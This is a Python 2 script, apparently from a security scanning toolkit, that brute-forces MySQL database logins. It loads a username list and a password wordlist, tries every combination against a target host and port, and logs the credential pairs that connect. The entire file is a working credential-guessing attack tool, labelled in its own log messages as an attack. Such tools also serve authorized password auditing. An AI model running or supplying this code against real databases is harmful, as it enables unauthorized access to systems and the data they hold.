#!/usr/bin/python
# -*- coding:utf-8 -*-
'''
need to install progressive bar to show the progress of attacking the database
GitHub: https://github.com/hfaran/progressive
install: pip install progressive
'''
import sys,getopt
import thread
from progressive.bar import Bar
from Logger import Log

host = '127.0.0.1'      #数据库主机
port = 3306             #服务器端口 默认3307
user_name_flie = None   #用户名列表
pass_file = None        #密码列表
available_pass = list()

def main():
    opts,args = getopt.getopt(sys.argv[1:], "s::p:u:w:")
    if len(opts) == 0:
        Log.log_error('Usage: python security_scan.py [-h hostname] [-p port] -u user.list.flie  -w password.list.file')
        sys.exit()
    for op, value in opts:
        if op == '-s':
            host = value
        elif op == '-p':
            port = value
        elif op == '-u':
            user_name_flie = value
        elif op == '-w':
            pass_file = value

    if user_name_flie == None:
        Log.log_error('No userlist was specified!')
        sys.exit()
    if pass_file == None:
        Log.log_error('No pass list was specified!')
        sys.exit()
    try:

        with open(user_name_flie, 'r') as up:
            global user_name_list
            user_name_list = up.read().split('\n')
            # print user_name_list
    except Exception, e:
        print e
        sys.exit(0)
    try:
        with open(pass_file, 'r') as wp:
            global pass_list
            pass_list = wp.read().split('\n')
           # print pass_list
    except Exception, e:
        print e
        sys.exit(0)
        
    start_attack()
    Log.log_pass("Available pass: %s" % available_pass)


def run(args):
    global host
    global port
    host = args.server_name
    port = args.server_port
    with open(args.user_list, 'r') as up:
        global user_name_list
        user_name_list = up.read().split('\n')
        # print user_name_list

    with open(args.word_list, 'r') as wp:
        global pass_list
        pass_list = wp.read().split('\n')
       # print pass_list

    start_attack()
    Log.log_info("Available pass: %s " % available_pass)
  

def start_attack():
    import MySQLdb
    global avalible_pass

    Log.log_info('Starting attack...')
    bar = Bar(max_value= len(user_name_list)*len(pass_list))
    bar.cursor.clear_lines(2)
    bar.cursor.save()
    i = 0

    for user_name in user_name_list:
        for password in pass_list:
            try:
                access = MySQLdb.connect(host=host, port=port, user=user_name, passwd=password)
                database_access = access.cursor()
                # print 'username:',user_name, " password:", password
                available_pass.append((user_name,password))
            except Exception, exception:
                if 'Access denied for user' in str(exception):
                    pass
                    # Log.log_error('Access denied')
                else:
                    Log.log_error(str(exception))
                    bar.cursor.clear_lines(2)
                    sys.exit()
            finally:
                i += 1
                bar.cursor.restore()
                bar.draw(i)

if __name__ == '__main__':
    main()
    
